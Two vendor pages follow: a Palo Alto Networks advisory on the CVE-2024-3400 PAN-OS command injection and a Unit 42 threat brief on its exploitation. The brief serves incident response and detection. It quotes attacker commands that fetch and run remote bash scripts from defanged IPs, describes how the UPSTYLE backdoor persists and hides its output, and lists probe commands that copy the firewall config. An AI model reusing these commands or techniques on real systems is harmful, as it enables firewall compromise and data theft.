=== Content from security.paloaltonetworks.com_8fd06104_20250111_061215.html ===


* [Get support](https://support.paloaltonetworks.com/support)
* [Security advisories](/)
* [Report vulnerabilities](/report)
* [Bug Bounty](/scope)
* [Subscribe](https://support.paloaltonetworks.com/SupportAccount/Preferences)
* [RSS feed](/rss.xml)
[Palo Alto Networks Security Advisories](/) /
CVE-2024-3400
## CVE-2024-3400 PAN-OS: Arbitrary File Creation Leads to OS Command Injection Vulnerability in GlobalProtect

Urgency
HIGHEST
047910
[Severity
10 ·
CRITICAL](https://www.first.org/cvss/calculator/4.0#CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:H/VI:H/VA:H/SC:H/SI:H/SA:H/AU:Y/R:U/V:C/RE:M/U:Red "CVSS-B: CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:H/VI:H/VA:H/SC:H/SI:H/SA:H/AU:Y/R:U/V:C/RE:M/U:Red")Response Effort
**MODERATE**Recovery
**USER**Value Density
**CONCENTRATED**Attack Vector
**NETWORK**Attack Complexity
**LOW**Attack Requirements
**NONE**Automatable
**YES**User Interaction
**NONE**Product Confidentiality
**HIGH**Product Integrity
**HIGH**Product Availability
**HIGH**Privileges Required
**NONE**Subsequent Confidentiality
**HIGH**Subsequent Integrity
**HIGH**Subsequent Availability
**HIGH**[CVE](https://www.cve.org/CVERecord?id=CVE-2024-3400 "See CVE.org record")
[JSON](/json/CVE-2024-3400 "Download the information in this advisory in CVE-JSON format")
[CSAF](/csaf/CVE-2024-3400 "Download the information in this advisory in CSAF format")

 Published
**2024-04-12** Updated
**2024-05-03**Reference
**PAN-252214**Discovered
**in production use**
### Description

A command injection as a result of arbitrary file creation vulnerability in the GlobalProtect feature of Palo Alto Networks PAN-OS software for specific PAN-OS versions and distinct feature configurations may enable an unauthenticated attacker to execute arbitrary code with root privileges on the firewall.

Cloud NGFW, Panorama appliances, and Prisma Access are not impacted by this vulnerability.

Customers should continue to monitor this security advisory for the latest updates and product guidance.

### Product Status

| Versions | Affected | Unaffected |
| Cloud NGFW | None | All |
| PAN-OS 11.1 | < 11.1.0-h3, < 11.1.1-h1, < 11.1.2-h3 | >= 11.1.0-h3, >= 11.1.1-h1, >= 11.1.2-h3 |
| PAN-OS 11.0 | < 11.0.0-h3, < 11.0.1-h4, < 11.0.2-h4, < 11.0.3-h10, < 11.0.4-h1 | >= 11.0.0-h3, >= 11.0.1-h4, >= 11.0.2-h4, >= 11.0.3-h10, >= 11.0.4-h1 |
| PAN-OS 10.2 | < 10.2.0-h3, < 10.2.1-h2, < 10.2.2-h5, < 10.2.3-h13, < 10.2.4-h16, < 10.2.5-h6, < 10.2.6-h3, < 10.2.7-h8, < 10.2.8-h3, < 10.2.9-h1 | >= 10.2.0-h3, >= 10.2.1-h2, >= 10.2.2-h5, >= 10.2.3-h13, >= 10.2.4-h16, >= 10.2.5-h6, >= 10.2.6-h3, >= 10.2.7-h8, >= 10.2.8-h3, >= 10.2.9-h1 |
| PAN-OS 10.1 | None | All |
| PAN-OS 10.0 | None | All |
| PAN-OS 9.1 | None | All |
| PAN-OS 9.0 | None | All |
| Prisma Access | None | All |

### Required Configuration for Exposure

This issue is applicable only to PAN-OS 10.2, PAN-OS 11.0, and PAN-OS 11.1 firewalls configured with GlobalProtect gateway or GlobalProtect portal (or both). Device telemetry does not need to be enabled for PAN-OS firewalls to be exposed to attacks related to this vulnerability.

You can verify whether you have a GlobalProtect gateway or GlobalProtect portal configured by checking for entries in your firewall web interface (Network > GlobalProtect > Gateways or Network > GlobalProtect > Portals).

### Severity: CRITICAL, Suggested Urgency: HIGHEST

CVSS-B:
10.0 ([CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:H/VI:H/VA:H/SC:H/SI:H/SA:H/AU:Y/R:U/V:C/RE:M/U:Red](https://www.first.org/cvss/calculator/4.0#CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:H/VI:H/VA:H/SC:H/SI:H/SA:H/AU:Y/R:U/V:C/RE:M/U:Red))

### Exploitation Status

Palo Alto Networks is aware of an increasing number of attacks that leverage the exploitation of this vulnerability. Proof of concepts for this vulnerability have been publicly disclosed by third parties.

We are also aware of proof-of-concept by third parties of post-exploit persistence techniques that survive resets and upgrades. We are not aware at this time of any malicious attempts to use these persistence techniques in active exploitation of the vulnerability. These fixes listed below and Threat Prevention signatures completely prevent the initial remote command execution, stopping subsequent post-exploitation or persistence.

More information about the vulnerability's exploitation in the wild can be found in the Unit 42 threat brief (<https://unit42.paloaltonetworks.com/cve-2024-3400/>) and the Palo Alto Networks PSIRT blog post (<https://www.paloaltonetworks.com/blog/2024/04/more-on-the-pan-os-cve/>).

### Weakness Type

[CWE-77 Improper Neutralization of Special Elements used in a Command ('Command Injection')](https://cwe.mitre.org/data/definitions/77 "More at https://cwe.mitre.org/data/definitions/77")

[CWE-20 Improper Input Validation](https://cwe.mitre.org/data/definitions/20 "More at https://cwe.mitre.org/data/definitions/20")

### Solution

We strongly advise customers to immediately upgrade to a fixed version of PAN-OS to protect their devices even when workarounds and mitigations have been applied.

This issue is fixed in PAN-OS 10.2.9-h1, PAN-OS 11.0.4-h1, PAN-OS 11.1.2-h3, and in all later PAN-OS versions. These fixes and those listed below completely prevent the initial remote command execution, stopping subsequent post-exploitation or persistence.

In addition, to provide the most seamless upgrade path for customers, additional hotfixes have been made available as a courtesy for other commonly deployed maintenance releases.

 `PAN-OS 10.2:`
[Terms of use](https://www.paloaltonetworks.com/legal-notices/terms-of-use)[Privacy](https://www.paloaltonetworks.com/legal-notices/privacy)[Product Security Assurance and Vulnerability Disclosure Policy](https://paloaltonetworks.com/product-security-assurance)[Report vulnerabilities](/report)[Manage subscriptions](https://support.paloaltonetworks.com/SupportAccount/Preferences)© 2025 Palo Alto Networks, Inc. All rights reserved.

=== Content from unit42.paloaltonetworks.com_9eff05c2_20250111_061217.html ===

[![Logo](/wp-content/uploads/2021/07/PANW_Parent.png)](https://www.paloaltonetworks.com/)

[![Unit42 Logo](https://unit42.paloaltonetworks.com/wp-content/themes/unit42-v6/dist/images/unit42-logo-white.svg)](https://unit42.paloaltonetworks.com/)

Menu

* [Tools](https://unit42.paloaltonetworks.com/tools/)
* [ATOMs](https://unit42.paloaltonetworks.com/atoms/)
* [Security Consulting](https://www.paloaltonetworks.com/unit42)
* [About Us](https://unit42.paloaltonetworks.com/about-unit-42/)
* [**Under Attack?**](https://start.paloaltonetworks.com/contact-unit42.html)

* [Threat Research Center](https://unit42.paloaltonetworks.com "Threat Research")
* [High Profile Threats](https://unit42.paloaltonetworks.com/category/top-cyberthreats/ "High Profile Threats")
* [Vulnerabilities](https://unit42.paloaltonetworks.com/category/vulnerabilities/ "Vulnerabilities")

[Vulnerabilities](https://unit42.paloaltonetworks.com/category/vulnerabilities/)
# Threat Brief: Operation MidnightEclipse, Post-Exploitation Activity Related to CVE-2024-3400 (Updated May 20)

![Clock Icon](https://unit42.paloaltonetworks.com/wp-content/themes/unit42-v6/dist/images/icons/icon-clock.svg)  12  min read

Related Products[![Advanced Threat Prevention icon](https://unit42.paloaltonetworks.com/wp-content/uploads/2024/06/strata_RGB_logo_Icon_Color.png)Advanced Threat Prevention](https://unit42.paloaltonetworks.com/product-category/advanced-threat-prevention/ "Advanced Threat Prevention")[![Cortex XDR icon](https://unit42.paloaltonetworks.com/wp-content/uploads/2024/06/cortex_RGB_logo_Icon_Color.png)Cortex XDR](https://unit42.paloaltonetworks.com/product-category/cortex-xdr/ "Cortex XDR")[![Cortex Xpanse icon](https://unit42.paloaltonetworks.com/wp-content/uploads/2024/06/cortex_RGB_logo_Icon_Color.png)Cortex Xpanse](https://unit42.paloaltonetworks.com/product-category/cortex-xpanse/ "Cortex Xpanse")[![Cortex XSIAM icon](https://unit42.paloaltonetworks.com/wp-content/uploads/2024/06/cortex_RGB_logo_Icon_Color.png)Cortex XSIAM](https://unit42.paloaltonetworks.com/product-category/cortex-xsiam/ "Cortex XSIAM")[![Managed Threat Hunting icon](https://unit42.paloaltonetworks.com/wp-content/uploads/2024/06/unit42_RGB_logo_Icon_Color.png)Managed Threat Hunting](https://unit42.paloaltonetworks.com/product-category/managed-threat-hunting/ "Managed Threat Hunting")[![Next-Generation Firewall icon](https://unit42.paloaltonetworks.com/wp-content/uploads/2024/06/strata_RGB_logo_Icon_Color.png)Next-Generation Firewall](https://unit42.paloaltonetworks.com/product-category/next-generation-firewall/ "Next-Generation Firewall")[![Prisma Access icon](https://unit42.paloaltonetworks.com/wp-content/uploads/2024/06/prisma_RGB_logo_Icon_Color.png)Prisma Access](https://unit42.paloaltonetworks.com/product-category/prisma-access/ "Prisma Access")

* ![Profile Icon](https://unit42.paloaltonetworks.com/wp-content/themes/unit42-v6/dist/images/icons/icon-profile-grey.svg)
  By:
  + [Unit 42](https://unit42.paloaltonetworks.com/author/unit42/)
* ![Published Icon](https://unit42.paloaltonetworks.com/wp-content/themes/unit42-v6/dist/images/icons/icon-calendar-grey.svg)
  Published:April 12, 2024
* ![Tags Icon](https://unit42.paloaltonetworks.com/wp-content/themes/unit42-v6/dist/images/icons/icon-category.svg)Categories:
  + [High Profile Threats](https://unit42.paloaltonetworks.com/category/top-cyberthreats/)
  + [Malware](https://unit42.paloaltonetworks.com/category/malware/)
  + [Vulnerabilities](https://unit42.paloaltonetworks.com/category/vulnerabilities/)
* ![Tags Icon](https://unit42.paloaltonetworks.com/wp-content/themes/unit42-v6/dist/images/icons/icon-tags-grey.svg)Tags:
  + [Backdoor](https://unit42.paloaltonetworks.com/tag/backdoor/)
  + [Command injection](https://unit42.paloaltonetworks.com/tag/command-injection/)
  + [CVE-2024-3400](https://unit42.paloaltonetworks.com/tag/cve-2024-3400/)
  + [MidnightEclipse](https://unit42.paloaltonetworks.com/tag/midnighteclipse/)
  + [Python](https://unit42.paloaltonetworks.com/tag/python/)
  + [Upstyle](https://unit42.paloaltonetworks.com/tag/upstyle/)

* [![Download Icon](https://unit42.paloaltonetworks.com/wp-content/themes/unit42-v6/dist/images/icons/icon-download.svg)](https://unit42.paloaltonetworks.com/cve-2024-3400/?pdf=download&lg=en&_wpnonce=a05dacd8dc "Click here to download")
* [![Print Icon](https://unit42.paloaltonetworks.com/wp-content/themes/unit42-v6/dist/images/icons/icon-print.svg)](https://unit42.paloaltonetworks.com/cve-2024-3400/?pdf=print&lg=en&_wpnonce=a05dacd8dc "Click here to print")

Share![Down arrow](https://unit42.paloaltonetworks.com/wp-content/themes/unit42-v6/dist/images/icons/down-arrow.svg)

* ![Link Icon](https://unit42.paloaltonetworks.com/wp-content/themes/unit42-v6/dist/images/icons/icon-share-link.svg)
* ![Link Email](https://unit42.paloaltonetworks.com/wp-content/themes/unit42-v6/dist/images/icons/icon-sms.svg)
* [![Facebook Icon](https://unit42.paloaltonetworks.com/wp-content/themes/unit42-v6/dist/images/icons/icon-fb-share.svg)](https://www.facebook.com/sharer/sharer.php?u=https%3A%2F%2Funit42.paloaltonetworks.com%2Fcve-2024-3400%2F "Share in Facebook")
* [![LinkedIn Icon](https://unit42.paloaltonetworks.com/wp-content/themes/unit42-v6/dist/images/icons/icon-linkedin-share.svg)](https://www.linkedin.com/sharing/share-offsite/?url=https%3A%2F%2Funit42.paloaltonetworks.com%2Fcve-2024-3400%2F&title=Threat%20Brief:%20Operation%20MidnightEclipse,%20Post-Exploitation%20Activity%20Related%20to%20CVE-2024-3400%20(Updated%20May%2020) "Share in LinkedIn")
* [![Twitter Icon](https://unit42.paloaltonetworks.com/wp-content/themes/unit42-v6/dist/images/icons/icon-twitter-share.svg)](https://twitter.com/intent/tweet?url=https%3A%2F%2Funit42.paloaltonetworks.com%2Fcve-2024-3400%2F&text=Threat%20Brief:%20Operation%20MidnightEclipse,%20Post-Exploitation%20Activity%20Related%20to%20CVE-2024-3400%20(Updated%20May%2020) "Share in Twitter")
* [![Reddit Icon](https://unit42.paloaltonetworks.com/wp-content/themes/unit42-v6/dist/images/icons/icon-reddit-share.svg)](//www.reddit.com/submit?url=https%3A%2F%2Funit42.paloaltonetworks.com%2Fcve-2024-3400%2F "Share in Reddit")
* [![Mastodon Icon](https://unit42.paloaltonetworks.com/wp-content/themes/unit42-v6/dist/images/icons/icon-mastodon-share.svg)](https://mastodon.social/share?text=Threat%20Brief:%20Operation%20MidnightEclipse,%20Post-Exploitation%20Activity%20Related%20to%20CVE-2024-3400%20(Updated%20May%2020)%20https%3A%2F%2Funit42.paloaltonetworks.com%2Fcve-2024-3400%2F "Share in Mastodon")

This post is also available in:
[日本語 (Japanese)](https://unit42.paloaltonetworks.jp/cve-2024-3400/)

## Executive Summary

**This threat brief is monitored daily and updated as new intelligence is available for us to share. The full update log is at the end of this post and offers the fullest account of all changes made.**

Palo Alto Networks and Unit 42 are engaged in tracking activity related to CVE-2024-3400 and are working with external researchers, partners and customers to share information transparently and rapidly.

A critical command injection vulnerability in Palo Alto Networks PAN-OS software enables an unauthenticated attacker to execute arbitrary code with root privileges on the firewall. The vulnerability, assigned CVE-2024-3400, has a CVSS score of 10.0.

This issue is applicable only to PAN-OS 10.2, PAN-OS 11.0, and PAN-OS 11.1 firewalls configured with GlobalProtect gateway or GlobalProtect portal (or both). This issue does not affect cloud firewalls (Cloud NGFW), Panorama appliances or Prisma Access.

For up-to-date information about affected products and versions, please refer to the [Palo Alto Networks Security Advisory](https://security.paloaltonetworks.com/CVE-2024-3400) on this issue. Additionally, [episode 21 of the Unit 42 podcast Threat Vector](https://thecyberwire.com/podcasts/threat-vector/21/notes) covers the discovery, technical details and exploitation of the vulnerability.

Palo Alto Networks is aware of an increasing number of attacks that leverage the exploitation of this vulnerability. Third parties have disclosed proofs of concept for this vulnerability. We are also aware of a proof of concept including post-exploit persistence techniques that survive resets and upgrades. We are not aware of any malicious attempts to use these persistence techniques in active exploitation of the vulnerability at this time.

We are tracking the initial exploitation of this vulnerability under the name Operation MidnightEclipse.

The section [Current Scope of the Attack](#post-133365-_50343o6a6han) includes information on the types of exploitation activity we have seen, as well as their relative prevalence. The vast majority of cases that Unit 42 has responded to have been unsuccessful attempts to exploit the vulnerability and some compromises of PAN-OS that are limited to confirming that the device is exploitable.

Other cases have included the following activity:

* Limited attempts in which a file on the hard drive has been copied to a location accessible via a web request
* A very limited number of compromises that led to interactive command execution

This threat brief will cover information about the vulnerability and what we know about post-exploitation activity. We will share guidance to mitigate the vulnerability, though readers should also refer to the [Security Advisory](https://security.paloaltonetworks.com/CVE-2024-3400) for specific product version information and remediation guidance. We will continue to update this threat brief as more information becomes available.

If you believe your firewall has been compromised, please reach out to [Palo Alto Networks support](https://support.paloaltonetworks.com/).

This issue is fixed in [hotfix releases](https://security.paloaltonetworks.com/CVE-2024-3400) of PAN-OS 10.2.9-h1, PAN-OS 11.0.4-h1, PAN-OS 11.1.2-h3 and all later PAN-OS versions. Hotfixes for other commonly deployed maintenance releases are also available. Additional guidance on mitigation for customers is available in the [Security Advisory.](https://security.paloaltonetworks.com/CVE-2024-3400)

A Knowledge Base article, [How to Remedy CVE-2024-3400](https://knowledgebase.paloaltonetworks.com/KCSArticleDetail?id=kA14u000000CrO6CAK), is available in the Customer Support Portal.

As a matter of best practice, Palo Alto Networks recommends that you monitor your network for abnormal activity and investigate any unexpected network activity.

We would like to thank Volexity for finding this issue and their continuing coordination and partnership. Please reference Volexity’s [blog](https://www.volexity.com/blog/2024/04/12/zero-day-exploitation-of-unauthenticated-remote-code-execution-vulnerability-in-globalprotect-cve-2024-3400) for their analysis.

Palo Alto Networks customers receive protections from and mitigations for CVE-2024-3400 and malware used in post-exploitation activity in the following ways:

Customers with a Threat Prevention subscription can block attacks for this vulnerability using Threat ID [95187](https://threatvault.paloaltonetworks.com/?query=95187), [95189](https://threatvault.paloaltonetworks.com/?query=95189) and [95191](https://threatvault.paloaltonetworks.com/?query=95191) (available in Applications and Threats content version 8836-8695 and later). [Our advisory has been updated](https://security.paloaltonetworks.com/CVE-2024-3400) with new Threat Prevention content updates for additional Threat Prevention IDs around CVE-2024-3400.

To apply the Threat IDs, customers must ensure that vulnerability protection has been applied to their GlobalProtect interface to prevent exploitation of this issue on their device. Please see the relevant [LIVEcommunity article](https://live.paloaltonetworks.com/t5/globalprotect-articles/applying-vulnerability-protection-to-globalprotect-interfaces/ta-p/340184) for more information.

The [Managed Threat Hunting](#post-133365-_vgezw6a4uez) section below includes XQL queries that can be used to search for signs of exploitation of this CVE.

| **Vulnerabilities Discussed** | [CVE-2024-3400](https://security.paloaltonetworks.com/CVE-2024-3400) |
| --- | --- |

## Details of the Vulnerability

A command injection vulnerability in Palo Alto Networks PAN-OS software enables an unauthenticated attacker to execute arbitrary code with root privileges on the firewall. This issue is applicable only to PAN-OS 10.2, PAN-OS 11.0, and PAN-OS 11.1 firewalls configured with GlobalProtect gateway or GlobalProtect portal (or both).

Palo Alto Networks is aware of targeted attacks that leverage this vulnerability. The next section covers details of the post-exploitation activity we’ve observed.

## Current Scope of the Attack

Palo Alto Networks has classified observations of attempted exploitation into several levels, from Level 0 to Level 3. In all cases we recommend following the guidance in the [Security Advisory](https://security.paloaltonetworks.com/CVE-2024-3400).

**Level 0: Probe –** An unsuccessful exploitation attempt. Forensic artifacts indicate that the attempt was made to access the customer network, but the attacker did not actually succeed. Palo Alto Networks assesses there is likely *little to no* immediate impact of a Level 0 attempt.

**Level 1: Test** **– The vulnerability was being tested on the device. A 0-byte file has been created and is resident on the firewall. However, there is no indication of any known unauthorized command execution.**

**Level 2: Potential Exfiltration –** A file on the device has been copied to a location accessible via a web request, though the file may or may not have been subsequently downloaded. Typically, the file we have observed being copied is running\_config.xml.

**Level 3: Interactive Access** **–** There are signs of interactive command execution. This may include shell-based backdoors, introduction of code, downloading files or running commands.

It is important to note that *the vast majority of cases that Unit 42 has responded to have been unsuccessful attempts to exploit the vulnerability and some Level 1 compromises of PAN-OS*. Other cases have included limited Level 2 and very limited Level 3 compromises of those targeted firewalls.

## UPSTYLE and Cron Job Backdoor Activity

As part of the activity observed in Operation MidnightEclipse, the threat actor exploited CVE-2024-3400 to run commands on the firewall. We have determined that the threat actor initially intended to install a Python-based backdoor, which our colleagues at Volexity referred to as UPSTYLE.

We believe the threat actors created UPSTYLE specifically for this campaign. However, the threat actors were unsuccessful at installing UPSTYLE after three different exploit attempts. After the third failed attempt, the threat actor decided to install a cron job backdoor to carry out their post-exploitation activities.

After failing to install UPSTYLE, the threat actor was observed exploiting CVE-2024-3400 to run a handful of the commands on the firewall. The commands included copying configuration files to the web application folder and exfiltrating them via HTTP requests to those files.

The following IP address was seen attempting to access a specific configuration file copied to this folder, which we believe is a VPN used by the threat actor:

* 66.235.168[.]222

After gathering configuration files, the threat actor exploited the vulnerability to run the following command to receive additional commands from an external server in the form of a bash script:

* wget -qO- hxxp://172.233.228[.]93/patch|bash

We were unable to access the bash script hosted at this URL. However, shortly after we saw evidence of the creation of a cron job. This cron job would run every minute to access commands hosted on the same external server that would execute via bash, as seen in the following command:

* wget -qO- hxxp://172.233.228[.]93/policy | bash

We were unable to access the commands executed via this URL, but we believe this cron job-based backdoor was used to carry out the actor’s post-exploitation activities.

While the threat actors were unable to install the UPSTYLE backdoor, it appears that they created it specifically for this campaign and planned on using it as the initial backdoor. Also, the reason the actors failed to install UPSTYLE included mistakes in the exploit attempts themselves, as well as trivial mistakes in the executed commands. While we have not seen UPSTYLE used in any other exploit attempts, it is possible that UPSTYLE could have been successfully installed on other devices.

As previously mentioned, the threat actors attempted three unsuccessful exploit attempts to run commands to install UPSTYLE. For two of these attempts, UPSTYLE was hosted at hxxp://144.172.79[.]92/update.py.

In the third exploit attempt, we saw the actor hosting the backdoor at nhdata.s3-us-west-2.amazonaws[.]com, which may suggest that the actors thought network-based protections caused the first two failed installation attempts. According to the following HTTP headers, it appears that the threat actor last modified UPSTYLE hosted at 144.172.79[.]92 on April 7, 2024:

Accept-Ranges: bytes
Content-Length: 5187
Content-Type: application/octet-stream
Date: Thu, 11 Apr 2024 16:12:16 GMT
Etag: "6612443d-1443"
Last-Modified: Sun, 07 Apr 2024 06:59:09 GMT
Server: nginx/1.18.0 (Ubuntu)

| 1234567 | Accept-Ranges: bytesContent-Length: 5187Content-Type: application/octet-streamDate: Thu, 11 Apr 2024 16:12:16 GMTEtag: "6612443d-1443"Last-Modified: Sun, 07 Apr 2024 06:59:09 GMTServer: nginx/1.18.0 (Ubuntu) |
| --- | --- |

The update.py file hosted at 144.172.79[.]92 has a SHA256 value of 3de2a4392b8715bad070b2ae12243f166ead37830f7c6d24e778985927f9caac. This file is a backdoor that has multiple layers.

First, update.py writes another Python script to the following location:

* [snip]/site-packages/system.pth

The Python script written to system.pth Base64-decodes an embedded Python script and executes it. This embedded Python script has two functions named protect and check, which are called in that order.

The protect function sends a SIGTERM signal and writes the contents of the system.pth file back to itself, likely as a persistence mechanism. The check function will read /proc/self/cmdline to see if it is running as monitor mp before running another Base64 embedded Python script, which is the functional backdoor.

The Python script run by system.pth has a function named \_\_main that will run in a thread. This function first reads the contents of the following file, along with its access and modified times:

* [snip]/css/bootstrap.min.css

It then enters an infinite loop that iterates once every two seconds, reading in the following file:

* [snip]/sslvpn\_ngx\_error.log

The script will then iterate through each line of the file and search the line for the threat actor's command using the following regular expression:

* img\[([a-zA-Z0-9+/=]+)\]

If the above regular expression matches, the script will Base64-encode the contents of the command and run it using the popen method within Python's OS module. The lines of the sslvpn\_ngx\_error.log file that do not match the regular expression are written back to the file, which essentially prunes the lines that contain commands from persisting in the sslvpn\_ngx\_error.log file for later analysis.

After running the command, the script writes the output of the command to the following file:

* [snip]/css/bootstrap.min.css

The script will then create another thread that runs a function called restore. The restore function takes the original content of the bootstrap.min.css file, as well as the original access and modified times, sleeps for 15 seconds and writes the original contents back to the file. It then sets the access and modified times back to their original values.

The point of this function is to avoid leaving the output of the commands available for analysis. Also, this suggests that the threat actor has automation built into the client side of this backdoor, as they only have 15 seconds to grab the results before the backdoor overwrites the file.

The use of legitimate log files to receive commands and a legitimate CSS file to exfiltrate the command results suggests that the threat actors developed this backdoor specifically to run on a compromised firewall.

## Guidance

We strongly advise customers to immediately upgrade to a fixed version of PAN-OS to protect their devices even when workarounds and mitigations have been applied.

This issue is fixed in hotfix releases of PAN-OS 10.2.9-h1, PAN-OS 11.0.4-h1, PAN-OS 11.1.2-h3, and in all later PAN-OS versions.

Please see the frequently updated [Palo Alto Networks Security Advisory on CVE-2024-3400](https://security.paloaltonetworks.com/CVE-2024-3400) for information on hotfixes and the most current guidance for mitigating this vulnerability. A Knowledge Base article, [How to Remedy CVE-2024-3400](https://knowledgebase.paloaltonetworks.com/KCSArticleDetail?id=kA14u000000CrO6CAK), is available in the Customer Support Portal.

In earlier versions of this advisory, disabling device telemetry was listed as a secondary mitigation action. Disabling device telemetry is no longer an effective mitigation. Device telemetry does not need to be enabled for PAN-OS firewalls to be exposed to attacks related to this vulnerability.

## Unit 42 Managed Threat Hunting Queries

The Unit 42 Managed Threat Hunting team continues to track any attempts to exploit this CVE across our customers, using Cortex XDR and the XQL queries below. Cortex XDR customers can also use these XQL queries to search for signs of exploitation.

// Description: Search for domain IOC in raw NGFW logs
dataset = panw\_ngfw\_url\_raw
| filter url\_domain ~= ".\*nhdata.s3-us-west-2.amazonaws.com"
| fields \_time, log\_source\_name, action, app, url\_domain, uri, url\_category, source\_ip, source\_port, dest\_ip, dest\_port, protocol, rule\_matched, rule\_matched\_uuid

| 1234 | // Description: Search for domain IOC in raw NGFW logsdataset = panw\_ngfw\_url\_raw| filter url\_domain ~= ".\*nhdata.s3-us-west-2.amazonaws.com"| fields \_time, log\_source\_name, action, app, url\_domain, uri, url\_category, source\_ip, source\_port, dest\_ip, dest\_port, protocol, rule\_matched, rule\_matched\_uuid |
| --- | --- |

// Description: Detect hits for the specific prevention signature for CVE-2024-3400
config case\_sensitive = false
| dataset = panw\_ngfw\_threat\_raw
| filter threat\_id in (95187,95189,95191)
| fields \_time, log\_source\_name, action, app\_category, app\_sub\_category, threat\_id, threat\_name, source\_ip, source\_port, dest\_ip, dest\_port, \*

| 12345 | // Description: Detect hits for the specific prevention signature for CVE-2024-3400config case\_sensitive = false| dataset = panw\_ngfw\_threat\_raw| filter threat\_id in (95187,95189,95191)| fields \_time, log\_source\_name, action, app\_category, app\_sub\_category, threat\_id, threat\_name, source\_ip, source\_port, dest\_ip, dest\_port, \* |
| --- | --- |

// Description: Hits for known IOCs in NGFW traffic
config case\_sensitive = false
| dataset = panw\_ngfw\_traffic\_raw
| filter source\_ip in ("110.47.250.103","126.227.76.24","38.207.148.123","147.45.70.100","199.119.206.28","38.181.70.3","149.28.194.95","78.141.232.174","38.180.128.159","64.176.226.203","38.180.106.167","173.255.223.159","38.60.218.153","185.108.105.110","146.70.192.174","149.88.27.212","154.223.16.34","38.180.41.251","203.160.86.91","45.121.51.2","172.233.228.93","66.235.168.222","144.172.79.92") or dest\_ip in ("110.47.250.103","126.227.76.24","38.207.148.123","147.45.70.100","199.119.206.28","38.181.70.3","149.28.194.95","78.141.232.174","38.180.128.159","64.176.226.203","38.180.106.167","173.255.223.159","38.60.218.153","185.108.105.110","146.70.192.174","149.88.27.212","154.223.16.34","38.180.41.251","203.160.86.91","45.121.51.2","172.233.228.93","66.235.168.222","144.172.79.92")
| fields \_time, log\_source\_name, action, action\_source, app, bytes\_sent, bytes\_received, bytes\_total, source\_ip, source\_port, dest\_ip, dest\_port, protocol, rule\_matched, rule\_matched\_uuid, session\_end\_reason

| 12345 | // Description: Hits for known IOCs in NGFW trafficconfig case\_sensitive = false| dataset = panw\_ngfw\_traffic\_raw| filter source\_ip in ("110.47.250.103","126.227.76.24","38.207.148.123","147.45.70.100","199.119.206.28","38.181.70.3","149.28.194.95","78.141.232.174","38.180.128.159","64.176.226.203","38.180.106.167","173.255.223.159","38.60.218.153","185.108.105.110","146.70.192.174","149.88.27.212","154.223.16.34","38.180.41.251","203.160.86.91","45.121.51.2","172.233.228.93","66.235.168.222","144.172.79.92") or dest\_ip in ("110.47.250.103","126.227.76.24","38.207.148.123","147.45.70.100","199.119.206.28","38.181.70.3","149.28.194.95","78.141.232.174","38.180.128.159","64.176.226.203","38.180.106.167","173.255.223.159","38.60.218.153","185.108.105.110","146.70.192.174","149.88.27.212","154.223.16.34","38.180.41.251","203.160.86.91","45.121.51.2","172.233.228.93","66.235.168.222","144.172.79.92") | fields \_time, log\_source\_name, action, action\_source, app, bytes\_sent, bytes\_received, bytes\_total, source\_ip, source\_port, dest\_ip, dest\_port, protocol, rule\_matched, rule\_matched\_uuid, session\_end\_reason |
| --- | --- |

// Description: Hits for known IOCs in XDR telemetry and NGFW telemetry (assuming proper integration of NGFW)
config case\_sensitive = false
| dataset = xdr\_data
| filter event\_type = ENUM.STORY
| filter dst\_action\_external\_hostname ~=".\*nhdata.s3-us-west-2.amazonaws.com" OR
dns\_query\_name ~=".\*nhdata.s3-us-west-2.amazonaws.com" OR
action\_external\_hostname ~=".\*nhdata.s3-us-west-2.amazonaws.com" OR
action\_remote\_ip in ("110.47.250.103","126.227.76.24","38.207.148.123","147.45.70.100","199.119.206.28","38.181.70.3","149.28.194.95","78.141.232.174","38.180.128.159","64.176.226.203","38.180.106.167","173.255.223.159","38.60.218.153","185.108.105.110","146.70.192.174","149.88.27.212","154.223.16.34","38.180.41.251","203.160.86.91","45.121.51.2","172.233.228.93","66.235.168.222","144.172.79.92")
| fields \_time, agent\_hostname, actor\_process\_image\_name, action\_local\_ip, action\_remote\_ip, action\_remote\_port, dns\_query\_name, action\_external\_hostname

| 123456789 | // Description: Hits for known IOCs in XDR telemetry and NGFW telemetry (assuming proper integration of NGFW)config case\_sensitive = false| dataset = xdr\_data | filter event\_type = ENUM.STORY| filter dst\_action\_external\_hostname ~=".\*nhdata.s3-us-west-2.amazonaws.com" ORdns\_query\_name ~=".\*nhdata.s3-us-west-2.amazonaws.com" ORaction\_external\_hostname ~=".\*nhdata.s3-us-west-2.amazonaws.com" ORaction\_remote\_ip in ("110.47.250.103","126.227.76.24","38.207.148.123","147.45.70.100","199.119.206.28","38.181.70.3","149.28.194.95","78.141.232.174","38.180.128.159","64.176.226.203","38.180.106.167","173.255.223.159","38.60.218.153","185.108.105.110","146.70.192.174","149.88.27.212","154.223.16.34","38.180.41.251","203.160.86.91","45.121.51.2","172.233.228.93","66.235.168.222","144.172.79.92") | fields \_time, agent\_hostname, actor\_process\_image\_name, action\_local\_ip, action\_remote\_ip, action\_remote\_port, dns\_query\_name, action\_external\_hostname |
| --- | --- |

## Additional Exploitation Observations

While continuing to monitor efforts, we have observed additional IP addresses attempting to exploit CVE-2024-3400 based on our Threat Prevention signature with a Threat ID 95187.

We have not seen any relationships between these indicators and those associated with Operation MidnightEclipse. We have grouped the latter of these indicators exclusively to the activity involving exploitation of the zero-day vulnerability and the UPSTYLE backdoor.

As of writing this update, the following IP addresses have triggered the threat prevention signature:

* 110.47.250[.]103
* 126.227.76[.]24
* 38.207.148[.]123
* 147.45.70[.]100
* 199.119.206[.]28
* 38.181.70[.]3
* 149.28.194[.]95
* 78.141.232[.]174
* 38.180.128[.]159
* 64.176.226[.]203
* 38.180.106[.]167
* 173.255.223[.]159
* 38.60.218[.]153
* 185.108.105[.]110
* 146.70.192[.]174
* 149.88.27[.]212
* 154.223.16[.]34
* 38.180.41[.]251
* 203.160.86[.]91
* 45.121.51[.]2

From our analysis, we do not see any additional activity from these IP addresses outside probing the vulnerability to determine either if the firewall is vulnerable or compromised. We have seen the following commands within the exploit attempts that the threat prevention signature is blocking:

* touch [snip]/global-protect/index.css
* touch [snip]/global-protect/portal/css/test.min.css
* cp [snip]/running-config.xml [snip]/global-protect/[16 random characters].css

